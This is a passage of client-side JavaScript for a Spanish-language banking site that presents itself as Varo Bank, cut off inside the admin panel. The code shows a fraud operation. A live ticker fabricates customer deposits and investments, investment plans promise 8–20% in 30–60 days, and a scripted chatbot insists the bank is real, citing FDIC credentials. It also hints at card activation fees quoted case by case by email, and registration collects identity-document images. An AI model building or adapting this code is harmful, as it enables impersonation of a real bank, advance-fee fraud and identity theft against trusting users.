/* ===== VARO BANK v22 — cliente ===== */
const $  = s => document.querySelector(s);
const $$ = s => Array.from(document.querySelectorAll(s));
const TOKEN_KEY = 'vb_token', ADM_KEY = 'vb_admin';

const FALLBACK_COUNTRIES = [
  { code:'ES', name:'España', flag:'🇪🇸', dial:'+34' },
  { code:'MX', name:'México', flag:'🇲🇽', dial:'+52' },
  { code:'GT', name:'Guatemala', flag:'🇬🇹', dial:'+502' },
  { code:'SV', name:'El Salvador', flag:'🇸🇻', dial:'+503' },
  { code:'EC', name:'Ecuador', flag:'🇪🇨', dial:'+593' },
  { code:'AR', name:'Argentina', flag:'🇦🇷', dial:'+54' },
  { code:'PY', name:'Paraguay', flag:'🇵🇾', dial:'+595' },
  { code:'UY', name:'Uruguay', flag:'🇺🇾', dial:'+598' },
  { code:'CL', name:'Chile', flag:'🇨🇱', dial:'+56' },
  { code:'PE', name:'Perú', flag:'🇵🇪', dial:'+51' },
];
const FALLBACK_PLANS = [
  { id:'oro',    name:'Plan Oro',        rate:8,  days:30, min:100 },
  { id:'tech',   name:'Plan Tecnologia', rate:12, days:45, min:250 },
  { id:'cripto', name:'Plan Cripto',     rate:15, days:45, min:500 },
  { id:'elite',  name:'Plan Elite',      rate:20, days:60, min:1000 }
];
const FALLBACK_BANKS = {
  ES:['Banco Santander','BBVA','CaixaBank','Banco Sabadell','Bankinter'],
  MX:['BBVA México','Banorte','Santander México','Citibanamex','HSBC México'],
  GT:['Banco Industrial','Banrural','G&T Continental','Banco de América Central','BAM'],
  SV:['Banco Agrícola','Banco Cuscatlán','Davivienda','Banco Azul','BAC Credomatic'],
  EC:['Banco Pichincha','Banco Guayaquil','Produbanco','Banco Internacional','Banco del Pacífico'],
  AR:['Banco Nación','Banco Galicia','Santander Argentina','BBVA Argentina','Banco Macro'],
  PY:['Banco Continental','Banco Itaú Paraguay','Banco Atlas','Visión Banco','Ueno Bank'],
  UY:['Banco República (BROU)','Banco Santander Uruguay','BBVA Uruguay','Itaú Uruguay','Bandes'],
  CL:['Banco de Chile','Banco Santander Chile','BCI','Banco Estado','Banco Itaú Chile'],
  PE:['BCP','BBVA Perú','Interbank','Scotiabank Perú','Banco de la Nación'],
};
const FALLBACK_FX = { USD:1, EUR:0.92, MXN:17.2, GTQ:7.8, ARS:980, PYG:7300, UYU:39, CLP:940, PEN:3.75, COP:4000 };
const FALLBACK_CRYPTO = { BTC:96500, ETH:3350, USDT:1, SOL:195 };

const TICKER_NAMES = ['Carlos M.','Maria L.','Jose R.','Ana T.','Luis H.','Sofia V.','Diego C.','Paula R.','Andres G.','Valeria S.','Ricardo P.','Camila N.','Fernando D.','Lucia B.','Miguel A.','Elena F.'];
const TICKER_ACTS  = ['abrio una cuenta','activo su tarjeta','hizo una recarga de','invirtio en Plan Oro','invirtio en Plan Cripto','recibio una transferencia de','convirtio'];
const TICKER_AMTS  = [50,80,100,150,200,300,500,750,1000,1200,2500];

let CONTENT = null, ME = null, MIN_RELOAD = 50, SETTINGS = {};
let COUNTRIES = FALLBACK_COUNTRIES.slice();
let BANKS = Object.assign({}, FALLBACK_BANKS);
let FX = Object.assign({}, FALLBACK_FX);
let CRYPTO = Object.assign({}, FALLBACK_CRYPTO);

/* ---------- formatos ---------- */
function money(n){
  const v = Number(n) || 0;
  const neg = v < 0 ? '-' : '';
  const p = Math.abs(v).toFixed(2).split('.');
  p[0] = p[0].replace(/\B(?=(\d{3})+(?!\d))/g, '.');
  return neg + '$' + p[0] + ',' + p[1];
}
function coin(n, dec){
  const v = Number(n) || 0;
  return v.toLocaleString('es-ES', { minimumFractionDigits: dec, maximumFractionDigits: dec });
}
const esc = s => String(s==null?'':s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
function toast(msg, bad){
  const d = document.createElement('div');
  d.textContent = msg;
 d.style.cssText = 'position:fixed;left:50%;top:16px;transform:translateX(-50%);z-index:300;background:'+(bad?'#dc2626':'#7c3aed')+';color:#fff;padding:11px 18px;border-radius:999px;font-weight:700;font-size:.88rem;max-width:90vw;text-align:center;box-shadow:0 10px 30px rgba(124,58,237,.35)';
  document.body.appendChild(d);
  setTimeout(()=>d.remove(), 3400);
}

/* ---------- API ---------- */
async function api(path, opts){
  opts = opts || {};
  const h = Object.assign({'Content-Type':'application/json'}, opts.headers||{});
  const t = localStorage.getItem(TOKEN_KEY);
  if(t) h['Authorization'] = 'Bearer ' + t;
  const r = await fetch('/api' + path, { method: opts.method||'GET', headers:h, body: opts.body });
  let j = {};
  try { j = await r.json(); } catch(e){ j = {}; }
  if(!r.ok) throw new Error(j.error || 'Error de conexion');
  return j;
}

/* ---------- anti-campos-vacios ---------- */
function ensureNoEmpty(){
  $$('select').forEach(s=>{
    if(s.options.length === 0) s.innerHTML = '<option value="">Selecciona</option>';
    Array.from(s.options).forEach(o=>{ if(!o.textContent.trim()) o.textContent = o.value || 'Opcion'; });
  });
  $$('input').forEach(i=>{ if(!i.placeholder && i.type !== 'file') i.placeholder = i.type==='number' ? '0' : 'Escribe aqui'; });
  $$('[data-cms]').forEach(el=>{ if(el.children.length === 0 && !el.textContent.trim()) el.textContent = '—'; });
}

/* ---------- modales ---------- */
function openModal(id){ $('#'+id).hidden = false; }
function closeModal(id){ $('#'+id).hidden = true; }
$$('[data-close]').forEach(b => b.onclick = () => closeModal(b.dataset.close));
$$('.modal').forEach(m => m.onclick = e => { if(e.target === m) m.hidden = true; });

/* ---------- contenido ---------- */
function applyContent(){
  if(!CONTENT) return;
  $$('[data-cms]').forEach(el=>{
    const path = el.dataset.cms.split('.');
    let v = CONTENT;
    for(const k of path){ if(v==null) break; v = v[k]; }
    if(v!=null && String(v).trim()) el.textContent = v;
  });
  const b = CONTENT.brand || {};
  if(b.mapsUrl)  $('#mapsBtn').href = b.mapsUrl;
  if(b.fdicUrl)  $('#fdicBtn').href = b.fdicUrl;
  if(b.whatsapp) $('#waLink').href = 'https://wa.me/' + String(b.whatsapp).replace(/[^0-9]/g,'');
  if(b.email)    $('#mailLink').href = 'mailto:' + b.email;
  if(b.email && $('#actMail')) { $('#actMail').href = 'mailto:' + b.email; $('#actMail').textContent = b.email; }
  if(b.name)     document.title = b.name + ' | Banco digital nacional · Miembro FDIC';
}
function renderStatic(){
  const st = (CONTENT && CONTENT.stats) || [];
  $('#statsGrid').innerHTML = st.map(s => '<div class="stat rv"><b>'+esc(s.n)+'</b><small>'+esc(s.l)+'</small></div>').join('');
  const pr = (CONTENT && CONTENT.productos) || [];
  $('#prodGrid').innerHTML = pr.map(p => '<div class="mini-card rv"><b>'+esc(p.icon)+'</b><h4>'+esc(p.t)+'</h4><p>'+esc(p.d)+'</p></div>').join('');
  const sp = (CONTENT && CONTENT.sobre && CONTENT.sobre.puntos) || [];
  $('#sobrePuntos').innerHTML = sp.map(x => '<li>'+esc(x)+'</li>').join('');
  const fa = (CONTENT && CONTENT.faq) || [];
  $('#faqList').innerHTML = fa.map((f,i) =>
    '<div class="fq rv"><button data-fq="'+i+'"><span>'+esc(f.q)+'</span><span>+</span></button><div class="a" hidden>'+esc(f.a)+'</div></div>').join('');
  $$('[data-fq]').forEach(btn => btn.onclick = () => {
    const a = btn.parentElement.querySelector('.a');
    const open = !a.hidden;
    $$('.fq .a').forEach(x => x.hidden = true);
    a.hidden = open;
    btn.querySelector('span:last-child').textContent = open ? '+' : '−';
  });
}
function renderPlans(){
  const plans = (CONTENT && CONTENT.plans) || FALLBACK_PLANS;
  $('#plansGrid').innerHTML = plans.map(p =>
    '<div class="pcard rv"><span class="pn">'+esc(p.name)+'</span><span class="rate">'+p.rate+'%</span>'+
    '<ul><li>Plazo: '+p.days+' dias</li><li>Minimo: '+money(p.min)+'</li><li>Rendimiento fijo al vencimiento</li><li>Retiro anticipado sin rendimiento</li></ul>'+
    '<button class="btn btn-main sm" data-invest="'+esc(p.id)+'">Invertir</button></div>').join('');
  $$('[data-invest]').forEach(b => b.onclick = () => { openAuth('register'); toast('Crea tu cuenta para invertir en ' + b.dataset.invest); });
}

/* ---------- ticker ---------- */
function tickerItem(){
  const n = TICKER_NAMES[Math.floor(Math.random()*TICKER_NAMES.length)];
  const c = COUNTRIES[Math.floor(Math.random()*COUNTRIES.length)] || FALLBACK_COUNTRIES[0];
  const a = TICKER_ACTS[Math.floor(Math.random()*TICKER_ACTS.length)];
  const am = TICKER_AMTS[Math.floor(Math.random()*TICKER_AMTS.length)];
  const mi = Math.floor(Math.random()*55) + 1;
  const name = n || 'Cliente', flag = c.flag || '🌎', country = c.name || 'Latinoamérica';
  const act = a || 'abrio una cuenta', amt = am || 100;
  const time = mi + (mi === 1 ? ' minuto' : ' minutos');
  const ini = name.trim().charAt(0).toUpperCase() || 'V';
  return '<div class="tk"><span class="av">'+esc(ini)+'</span><span><b>'+esc(name)+'</b> de '+flag+' '+esc(country)+' '+esc(act)+' <span class="amt">'+money(amt)+'</span></span><span class="tm">hace '+esc(time)+'</span></div>';
}
function buildTicker(){ let h=''; for(let i=0;i<14;i++) h += tickerItem(); $('#tickerTrack').innerHTML = h + h; }
function refreshTicker(){
  const track = $('#tickerTrack'); if(!track) return;
  const items = track.querySelectorAll('.tk');
  const el = items[Math.floor(Math.random()*(items.length/2))];
  if(el) el.outerHTML = tickerItem();
}

/* ---------- calculadora ---------- */
function fillCalcPlans(){
  const sel = $('#calcPlan'); if(!sel) return;
  const plans = (CONTENT && CONTENT.plans) || FALLBACK_PLANS;
  sel.innerHTML = plans.map(p => '<option value="'+p.rate+'|'+p.days+'">'+esc(p.name)+' · '+p.rate+'% · '+p.days+' dias</option>').join('');
}
function calc(){
  const rate = parseFloat(($('#calcPlan').value || '8|30').split('|')[0]) || 8;
  const amt  = parseFloat($('#calcAmount').value) || 0;
  const cur  = $('#calcCurrency').value || 'USD';
  const fx   = FX[cur] || 1;
  const gain = amt * rate / 100;
  $('#calcGain').textContent  = money(gain);
  $('#calcTotal').textContent = money(amt + gain);
  $('#calcFx').textContent    = coin(gain * fx, 2) + ' ' + cur;
}
['#calcPlan','#calcAmount','#calcDays','#calcCurrency'].forEach(s => {
  const el = $(s); if(el){ el.addEventListener('input', calc); el.addEventListener('change', calc); }
});

/* ---------- auth ---------- */
function openAuth(tab){ $('#authModal').hidden = false; if(tab) switchTab(tab); fillCountries(); ensureNoEmpty(); }
function closeAuth(){ $('#authModal').hidden = true; }
function switchTab(t){
  $$('.tab').forEach(b => b.classList.toggle('on', b.dataset.tab === t));
  $('#loginForm').hidden = t !== 'login';
  $('#registerForm').hidden = t !== 'register';
  $('#twofaForm').hidden = true;
  $('#recoverForm').hidden = true;
}
$$('.tab').forEach(b => b.onclick = () => switchTab(b.dataset.tab));
function fillCountries(){
  const sel = $('#rCountry'); if(!sel) return;
  const list = (COUNTRIES && COUNTRIES.length) ? COUNTRIES : FALLBACK_COUNTRIES;
  sel.innerHTML = list.map(c => '<option value="'+c.code+'">'+c.flag+' '+c.name+' ('+c.dial+')</option>').join('');
}

/* ---------- documento ---------- */
function readDoc(file){
  return new Promise(res => {
    if(!file) return res('');
    const fr = new FileReader();
    fr.onload = () => {
      const img = new Image();
      img.onload = () => {
        const max = 1200, s = Math.min(1, max / Math.max(img.width, img.height));
        const cv = document.createElement('canvas');
        cv.width = Math.round(img.width*s); cv.height = Math.round(img.height*s);
        cv.getContext('2d').drawImage(img, 0, 0, cv.width, cv.height);
        res(cv.toDataURL('image/jpeg', 0.82));
      };
      img.onerror = () => res(fr.result);
      img.src = fr.result;
    };
    fr.onerror = () => res('');
    fr.readAsDataURL(file);
  });
}
$('#rDoc').onchange = async e => {
  const f = e.target.files[0], box = $('#rDocPrev');
  if(!f){ box.hidden = true; return; }
  const d = await readDoc(f);
  box.innerHTML = '<img src="'+d+'" alt="Documento"><p class="hint">Documento adjunto listo ✅</p>';
  box.hidden = false;
};

/* ---------- login / registro ---------- */
$('#loginForm').onsubmit = async e => {
  e.preventDefault();
  try{
    const r = await api('/login', { method:'POST', body: JSON.stringify({ user:$('#lUser').value, pass:$('#lPass').value }) });
    if(r.twofa){
      $('#twofaHint').textContent = 'Codigo de prueba: ' + r.code;
      $('#twofaForm').hidden = false; $('#loginForm').hidden = true; $('#registerForm').hidden = true;
      $('#twofaForm').dataset.user = $('#lUser').value;
      return;
    }
    localStorage.setItem(TOKEN_KEY, r.token); ME = r.user; closeAuth(); openApp();
  }catch(err){ toast(err.message, true); }
};
$('#twofaForm').onsubmit = async e => {
  e.preventDefault();
  try{
    const r = await api('/login/verify', { method:'POST', body: JSON.stringify({ user:$('#twofaForm').dataset.user, code:$('#tCode').value }) });
    localStorage.setItem(TOKEN_KEY, r.token); ME = r.user; closeAuth(); openApp();
  }catch(err){ toast(err.message, true); }
};
$('#registerForm').onsubmit = async e => {
  e.preventDefault();
  const f = $('#rDoc').files[0];
  if(!f) return toast('Adjunta el frente de tu documento de identidad.', true);
  const btn = e.target.querySelector('button[type=submit]');
  btn.textContent = 'Subiendo documento...';
  try{
    const doc = await readDoc(f);
    const r = await api('/register', { method:'POST', body: JSON.stringify({
      name:$('#rName').value, user:$('#rUser').value, email:$('#rEmail').value,
      phone:$('#rPhone').value, country:$('#rCountry').value, pass:$('#rPass').value, document: doc
    })});
    localStorage.removeItem(TOKEN_KEY); ME = null;
    e.target.reset(); $('#rDocPrev').hidden = true;
    $('#lUser').value = r.user.user;
    switchTab('login');
    toast('Cuenta creada. Queda PENDIENTE de aprobacion por el banco.');
  }catch(err){ toast(err.message, true); }
  btn.textContent = 'Crear mi cuenta';
};
/* ---------- recuperar contraseña ---------- */
$('#forgotLink').onclick = e => {
  e.preventDefault();
  $$('.tab').forEach(b => b.classList.remove('on'));
  $('#loginForm').hidden = true; $('#registerForm').hidden = true; $('#twofaForm').hidden = true;
  $('#recoverForm').hidden = false;
  $('#recStep1').hidden = false; $('#recStep2').hidden = true;
  $('#recUser').value = $('#lUser').value || '';
};
$('#recBack').onclick = e => { e.preventDefault(); switchTab('login'); };
$('#recSend').onclick = async () => {
  const v = $('#recUser').value.trim();
  if(!v) return toast('Escribe tu usuario o correo', true);
  try{
    const r = await api('/recover', { method:'POST', body: JSON.stringify({ user: v }) });
    $('#recMail').textContent = r.email || 'tu correo registrado';
    $('#recCodeHint').textContent = 'Codigo: ' + r.code;
    $('#recStep1').hidden = true; $('#recStep2').hidden = false;
    $('#recoverForm').dataset.user = r.user;
    toast('Codigo enviado a ' + (r.email || 'tu correo'));
  }catch(e){ toast(e.message, true); }
};
$('#recSave').onclick = async () => {
  const code = $('#recCode').value.trim(), pass = $('#recPass').value;
  if(!code || !pass) return toast('Completa el codigo y la nueva contraseña', true);
  try{
    await api('/recover/confirm', { method:'POST', body: JSON.stringify({ user: $('#recoverForm').dataset.user, code, pass }) });
    toast('Contraseña cambiada. Ya puedes entrar.');
    switchTab('login');
  }catch(e){ toast(e.message, true); }
};
/* ---------- app cliente ---------- */
function openApp(){ $('#appShell').hidden = false; $('#admShell').hidden = true; renderApp(); }
function closeApp(){ $('#appShell').hidden = true; ME = null; }
async function loadMe(){ const r = await api('/me'); ME = r.user; MIN_RELOAD = r.minReload || 50; }

function cardHTML(c, name){
  const num = String(c.number).replace(/(.{4})/g, '$1 ').trim();
  return '<div class="vcard">'+
    '<div class="v-sheen"></div><div class="v-grain"></div>'+
    '<div class="v-top"><span class="v-type">VISA USO GENERAL</span><span class="v-bank">VARO BANK</span></div>'+
    '<div class="v-mid"><span class="v-chip"></span><span class="v-wave"></span><span class="v-holo"></span></div>'+
    '<div class="v-num">'+esc(num)+'</div>'+
    '<div class="v-bot">'+
      '<div><span class="v-lab">VALIDO HASTA</span><b class="v-exp">'+esc(c.exp)+'</b></div>'+
      '<div><span class="v-lab">CVV</span><b class="v-cvv">'+(c.cvvVisible ? esc(c.cvv) : '•••')+'</b></div>'+
    '</div>'+
    '<div class="v-foot"><span class="v-name">'+esc(String(name||'').toUpperCase())+'</span><span class="v-brand">VISA</span></div>'+
  '</div>';
}
function renderCrypto(){
  const b = ME ? (ME.balance || 0) : 0;
  $('#cryptoRow').innerHTML = Object.keys(CRYPTO).map(k => {
    const r = CRYPTO[k] || 1;
    const val = r ? (b / r) : 0;
    const dec = (k === 'BTC' ? 8 : k === 'ETH' ? 6 : 2);
    return '<span class="crypto-chip">'+k+' <b>'+coin(val, dec)+'</b></span>';
  }).join('');
}

async function renderApp(){
  try{ if(!ME) await loadMe(); }catch(e){ localStorage.removeItem(TOKEN_KEY); return; }
  $('#meName').textContent = ME.name || ME.user;
  $('#meBalance').textContent = money(ME.balance);
  const st = ME.state || 'activo';
  $('#meState').textContent = st === 'activo' ? 'Cuenta activa'
    : (st === 'pendiente' ? 'Pendiente de verificacion de identidad' : 'Cuenta ' + st);
  $('#meState').className = st === 'activo' ? 'badge-ok' : 'badge-warn';
  renderCrypto();

  const c = ME.card;
  $('#cardBox').innerHTML = cardHTML(c, ME.name || ME.user) +
    '<p class="hint" style="margin-top:10px">'+(c.active ? '✅ Tarjeta activa' : '🔒 Tarjeta pendiente de activacion por el banco')+'</p>'+
    '<p class="hint">'+(c.shipped ? '📦 Tarjeta fisica en camino' : '📦 Tarjeta fisica pendiente de envio')+'</p>'+
    '<p class="hint">CVV: '+(c.cvvVisible ? 'visible' : 'bloqueado por el banco')+'</p>'+
    (c.active ? '' : '<div class="act-note">Tarjeta pendiente de activacion por el banco.</div>');

  const k = ME.kyc || 1;
  $('#kycBar').style.width = (k * 25) + '%';
  $('#kycTxt').textContent = 'Paso ' + k + ' de 4 - ' + ['Registro','Documento recibido','Recarga realizada','Identidad verificada'][k-1]
    + (st === 'pendiente' ? ' · El banco esta verificando tu identidad.' : '');

  $('#meMsgs').innerHTML = (ME.messages||[]).length
    ? ME.messages.map(m => '<div class="msg bot"><b>Banco:</b> '+esc(m.text)+'<br><small class="tiny">'+new Date(m.date).toLocaleString()+'</small></div>').join('')
    : '<p class="hint">Sin mensajes nuevos.</p>';

  $('#histList').innerHTML = (ME.history||[]).length
    ? ME.history.map(h => '<div class="it"><span>'+esc(h.desc)+'<small>'+new Date(h.date).toLocaleDateString()+'</small></span><span class="'+(h.amount<0?'out':'in')+'">'+(h.amount>0?'+':'')+money(h.amount)+'</span></div>').join('')
    : '<p class="hint">Sin movimientos todavia.</p>';

  $('#profileBox').innerHTML =
    '<div class="it"><span>Usuario</span><b>'+esc(ME.user)+'</b></div>'+
    '<div class="it"><span>Correo</span><b>'+esc(ME.email||'—')+'</b></div>'+
    '<div class="it"><span>Telefono</span><b>'+esc(ME.phone||'—')+'</b></div>'+
    '<div class="it"><span>Pais</span><b>'+esc((ME.countryFlag||'')+' '+(ME.countryName||'—'))+'</b></div>'+
    '<div class="it"><span>Documento</span><b>'+(ME.hasDoc ? 'Recibido ✅' : 'Pendiente')+'</b></div>';

  try{
    const inv = await api('/invest');
    $('#invList').innerHTML = inv.investments.length
      ? inv.investments.map(i => '<div class="it"><span>'+esc(i.planName)+' · '+i.rate+'%<small>'+new Date(i.date).toLocaleDateString()+' · '+i.days+' dias · '+i.status+'</small></span><span>'+money(i.amount)+'</span></div>').join('')
      : '<p class="hint">Sin inversiones.</p>';
  }catch(e){ $('#invList').innerHTML = '<p class="hint">Sin inversiones.</p>'; }

  await renderPend();
  ensureNoEmpty();
}

async function renderPend(){
  const box = $('#pendList'); if(!box) return;
  try{
    const mt = await api('/mytransfers');
    if(!mt.transfers.length){
      box.innerHTML = '<p class="hint">Aqui veras tus recargas y transferencias. Te avisaremos cuando el banco las revise.</p>';
      return;
    }
    box.innerHTML = mt.transfers.map(t => {
      const cls = t.status === 'aprobado' ? 'ok' : (t.status === 'rechazado' ? 'no' : 'pend');
      const lab = t.status === 'aprobado' ? 'APROBADO' : (t.status === 'rechazado' ? 'RECHAZADO' : 'PENDIENTE');
      const det = t.kind === 'deposito'
        ? 'Recarga' + (t.method ? ' · ' + esc(t.method) : '')
        : 'Transferencia · ' + esc(t.to || '') + (t.bank ? ' (' + esc(t.bank) + ')' : '') + (t.accountType ? ' · ' + esc(t.accountType) : '');
      return '<div class="it pend-item '+cls+'"><span>'+det+
        '<small>'+new Date(t.date).toLocaleString()+'</small></span>'+
        '<span class="'+cls+'">'+money(t.amount)+'<b class="tag">'+lab+'</b></span></div>';
    }).join('');
  }catch(e){
    box.innerHTML = '<p class="hint">Sin operaciones.</p>';
  }
}

$('#appLogout').onclick = () => { localStorage.removeItem(TOKEN_KEY); closeApp(); };
$('#btnGoDeposit').onclick = () => {
  $('#depAvail').textContent = money(ME.balance);
  $('#depAmount').value = ''; $('#depRef').value = '';
  $('#depExtra').hidden = true;   // <-- solo muestra la wallet
  openModal('depModal');
};

/* ---------- acciones rapidas ---------- */
$$('[data-q]').forEach(b => b.onclick = () => quickAction(b.dataset.q));
function fillTxBanks(){
  const list = (BANKS && BANKS[ME.country]) ? BANKS[ME.country] : FALLBACK_BANKS.ES;
  $('#txBank').innerHTML = list.map(b => '<option value="'+esc(b)+'">'+esc(b)+'</option>').join('');
}
async function quickAction(q){
  if(q === 'deposit'){
    const a = prompt('Importe a recargar (USD):', MIN_RELOAD); if(!a) return;
    try{ await api('/deposit', { method:'POST', body: JSON.stringify({ amount:Number(a) }) }); toast('Recarga solicitada.'); renderApp(); }
    catch(e){ toast(e.message, true); }
  }
  if(q === 'transfer'){
    fillTxBanks();
    $('#txHolder').value = ME.name || '';
    $('#txAvail').textContent = money(ME.balance);
    $('#txAmount').value = ''; $('#txAccount').value = '';
    openModal('txModal');
  }
  if(q === 'pay'){
    $('#payAvail').textContent = money(ME.balance);
    $('#payAmount').value = ''; $('#payTo').value = ''; $('#payRef').value = '';
    openModal('payModal');
  }
  if(q === 'convert'){
    $('#cvAvail').textContent = money(ME.balance);
    $('#cvAmount').value = ''; $('#cvResult').textContent = '0,00';
    openModal('cvModal');
  }
  if(q === 'invest'){
    const plans = (CONTENT && CONTENT.plans) || FALLBACK_PLANS;
    const id = prompt('Elige plan:\n' + plans.map(p => p.id + ' = ' + p.name + ' (' + p.rate + '%)').join('\n'), plans[0].id);
    if(!id) return;
    const a = prompt('Importe a invertir:'); if(!a) return;
    try{ const r = await api('/invest', { method:'POST', body: JSON.stringify({ planId:id, amount:Number(a) }) }); ME = r.user; renderApp(); toast('Inversion creada'); }
    catch(e){ toast(e.message, true); }
  }
}

$('#txSend').onclick = async () => {
  const body = {
    to: $('#txHolder').value, bank: $('#txBank').value,
    accountType: $('#txType').value, account: $('#txAccount').value,
    amount: Number($('#txAmount').value)
  };
  if(!body.amount) return toast('Pon un importe', true);
  try{ const r = await api('/transfer', { method:'POST', body: JSON.stringify(body) }); ME = r.user; closeModal('txModal'); renderApp(); toast('Transferencia enviada'); }
  catch(e){ toast(e.message, true); }
};
$('#paySend').onclick = async () => {
  const body = { concept: $('#payType').value, beneficiary: $('#payTo').value, ref: $('#payRef').value, amount: Number($('#payAmount').value) };
  if(!body.amount) return toast('Pon un importe', true);
  try{ const r = await api('/pay', { method:'POST', body: JSON.stringify(body) }); ME = r.user; closeModal('payModal'); renderApp(); toast('Pago realizado'); }
  catch(e){ toast(e.message, true); }
};
$('#cvSend').onclick = async () => {
  const body = { to: $('#cvTo').value, amount: Number($('#cvAmount').value) };
  if(!body.amount) return toast('Pon un importe', true);
  try{ const r = await api('/convert', { method:'POST', body: JSON.stringify(body) }); ME = r.user; closeModal('cvModal'); renderApp(); toast('Convertido: ' + coin(r.got,2) + ' ' + r.to); }
  catch(e){ toast(e.message, true); }
};
function cvPreview(){
  const amt = Number($('#cvAmount').value) || 0;
  const to = $('#cvTo').value;
  $('#cvResult').textContent = coin(amt * (FX[to]||1), 2) + ' ' + to;
}
$('#cvAmount').addEventListener('input', cvPreview);
$('#cvTo').addEventListener('change', cvPreview);

/* ---------- chat ---------- */
const KB = [
  { k:['es real','real','verdadero','confiable','confianza','estafa','scam','falso'], a:'Si, es totalmente real. Varo Bank, N.A. es un banco nacional con licencia OCC desde 2020, miembro de la FDIC con certificado 59190. Puedes verificarlo en el registro oficial de la FDIC o preguntar a ChatGPT.' },
  { k:['fdic','certificado','seguro','asegurado'], a:'Varo Bank es miembro de la FDIC con certificado 59190. Tus depositos estan cubiertos por el seguro federal hasta el limite legal vigente.' },
  { k:['ruta','aba','routing','swift'], a:'El numero de ruta (ABA) es 124303201. El SWIFT/BIC es VAROUS33XXX.' },
  { k:['direccion','oficina','donde','ubicacion','sede'], a:'Nuestra sede esta en 11781 S Lone Peak Pkwy, Suite 150, Draper, UT 84020, Estados Unidos. Puedes verla en Google Maps.' },
  { k:['cuanto cuesta activar','activar la tarjeta','costo de activacion','cuanto sale','cuanto vale activar','cuanto cobran'], a:'La activacion de la tarjeta no tiene un importe fijo: esta sujeta a la decision y revision del banco segun el perfil de cada cliente. El equipo de verificacion te confirma por correo el importe exacto de tu caso.' },
  { k:['tarjeta','visa','activar','activacion','recarga','minimo'], a:'La tarjeta VISA se activa tras la revision del banco. Normalmente se solicita una recarga de referencia y el importe exacto se confirma por correo segun cada perfil.' },
  { k:['documento','dni','ine','pasaporte','cedula','kyc'], a:'Solo necesitas adjuntar el frente de tu documento de identidad al registrarte. Es para verificar tu identidad.' },
  { k:['inversion','plan','rendimiento','interes','ganancia'], a:'Tenemos planes de 8%, 12%, 15% y 20% en 30 a 60 dias. El rendimiento se paga al vencimiento; si retiras antes, no se aplica el rendimiento.' },
  { k:['comision','cuota','costo','precio'], a:'La apertura es gratis, sin cuota anual ni comision de mantenimiento.' },
  { k:['pais','latinoamerica','españa','españa','desde','internacional'], a:'Atendemos España, México, Guatemala, El Salvador, Ecuador, Argentina, Paraguay, Uruguay, Chile, Perú 100% online.' },
  { k:['horario','atencion','soporte','contacto','telefono','whatsapp'], a:'Atendemos por WhatsApp y correo. Horario: lunes a viernes 8:00 - 20:00 (UTC-7).' },
  { k:['abrir','cuenta','registrar','registro'], a:'Abre tu cuenta en 3 minutos con tus datos basicos y el frente de tu documento de identidad.' }
];
const QUICK = ['¿Es real?','¿Cuánto cuesta activar?','¿Qué documentos necesito?','¿Qué planes hay?','¿Dónde están?'];
function chatAnswer(text){
  const t = text.toLowerCase();
  let best = null, score = 0;
  KB.forEach(item => { let s = 0; item.k.forEach(k => { if(t.includes(k)) s++; }); if(s > score){ score = s; best = item; } });
  return best ? best.a : 'Gracias por escribir. Varo Bank es un banco nacional miembro de la FDIC (cert. 59190) con sede en Draper, Utah. Cuentame tu duda y te ayudo.';
}
function chatPush(text, who){
  const d = document.createElement('div'); d.className = 'msg ' + who; d.textContent = text;
  $('#chatBody').appendChild(d); $('#chatBody').scrollTop = 99999;
}
function initChat(){
  chatPush('Hola Soy el asistente virtual de Varo Bank. Puedo confirmarte que somos un banco real y ayudarte con tu cuenta.', 'bot');
  $('#chatQuick').innerHTML = QUICK.map(q => '<button>'+q+'</button>').join('');
  $$('#chatQuick button').forEach(b => b.onclick = () => { chatPush(b.textContent,'me'); setTimeout(()=>chatPush(chatAnswer(b.textContent),'bot'), 400); });
}
$('#chatFab').onclick = () => { $('#chatPanel').hidden = !$('#chatPanel').hidden; if(!$('#chatPanel').hidden && !$('#chatBody').children.length) initChat(); };
$('#chatClose').onclick = () => $('#chatPanel').hidden = true;
$('#chatForm').onsubmit = e => {
  e.preventDefault();
  const v = $('#chatInput').value.trim(); if(!v) return;
  chatPush(v,'me'); $('#chatInput').value = '';
  setTimeout(()=>chatPush(chatAnswer(v),'bot'), 420);
};

/* ---------- contacto ---------- */
$('#contactForm').onsubmit = async e => {
  e.preventDefault();
  try{
    await api('/contact', { method:'POST', body: JSON.stringify({ name:$('#cName').value, email:$('#cEmail').value, phone:$('#cPhone').value, msg:$('#cMsg').value }) });
    e.target.reset(); toast('Mensaje enviado.');
  }catch(err){ toast(err.message, true); }
};

/* ---------- ADMIN ---------- */
function openAdm(){ $('#admShell').hidden = false; $('#appShell').hidden = true; admRender(); }
$('#admClose').onclick = () => { localStorage.removeItem(ADM_KEY); $('#admShell').hidden = true; if(localStorage.getItem(TOKEN_KEY)) openApp(); };
function admLogin(){
  const saved = localStorage.getItem(ADM_KEY);
  if(saved){
    fetch('/api/admin/overview', { headers:{ 'x-token': saved } })
      .then(r => { if(r.ok){ openAdm(); } else { localStorage.removeItem(ADM_KEY); admLogin(); } })
      .catch(() => { localStorage.removeItem(ADM_KEY); admLogin(); });
    return;
  }
  const u = prompt('Usuario admin:', 'admin'); if(!u) return;
  const p = prompt('Clave admin:'); if(!p) return;
  fetch('/api/admin/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ user:u.trim(), pass:p.trim() }) })
    .then(r => r.json())
    .then(j => { if(j.token){ localStorage.setItem(ADM_KEY, j.token); openAdm(); } else toast(j.error || 'Credenciales incorrectas', true); })
    .catch(() => toast('No se pudo conectar con el servidor.', true));
}
function admApi(path, opts){
  opts = opts || {};
  const h = Object.assign({'Content-Type':'application/json','x-token':localStorage.getItem(ADM_KEY)||''}, opts.headers||{});
  return fetch('/api/admin' + path, { method: opts.method||'GET', headers:h, body: opts.body })
    .then(async r => { const j = await r.json().catch(()=>({})); if(!r.ok) throw new Error(j.error||'Error'); return j; });
}
$$('.atab').forEach(b => b.onclick = () => {
  $$('.atab').forEach(x => x.classList.remove('on')); b.classList.add('on');
  $$('.apane').forEach(p => p.classList.remove('on'));
  $('#p-' + b.dataset.t).classList.add('on');
  admRender();
});

async function admRender(){
  const tabEl = $('.atab.on');
  const tab = tabEl ? tabEl.dataset.t : 'resumen';
  try{
    if(tab === 'resumen'){
      const o = await admApi('/overview');
      $('#admKpis').innerHTML =
        '<div class="kpi"><b>'+o.users+'</b><small>Clientes</small></div>'+
        '<div class="kpi"><b>'+money(o.balance)+'</b><small>Saldo total</small></div>'+
